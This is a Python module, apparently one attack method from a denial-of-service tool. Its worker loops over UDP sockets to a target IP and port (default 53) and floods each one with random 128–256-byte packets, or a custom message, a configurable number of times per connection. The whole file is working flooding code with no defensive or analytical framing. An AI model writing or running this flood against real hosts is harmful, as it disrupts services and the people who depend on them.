from . import BaseMethod
from socket import AF_INET, SOCK_DGRAM, SHUT_WR
from random import randbytes, randint


class Method(BaseMethod):
    def __init__(self, params: dict):
        super().__init__(params)
        if self.params["Port"] is None:
            self.params["Port"] = 53

    def worker(self) -> None:
        is_custom_msg = bool(self.params.get("Message"))
        data: bytes
        rpc = self.params["RPC"]

        while not self.is_terminate:
            s = self.create_socket(AF_INET, SOCK_DGRAM)
            s.settimeout(self.params["Timeout"])

            try:
                s.connect((self.params["Ip"], self.params["Port"]))
                self.put_to_receive_queue(s)

                for i in range(0, rpc):
                    if self.is_terminate:
                        break
                    self.throttle()

                    if is_custom_msg:
                        data = self.params["Message"].encode(encoding="raw_unicode_escape")
                    else:
                        data = randbytes(randint(128, 256))

                    if not self.send_to_socket(s, data):
                        break
                s.shutdown(SHUT_WR)
            except OSError as e:
                self.last_error = e
                self.total_failed_count += 1
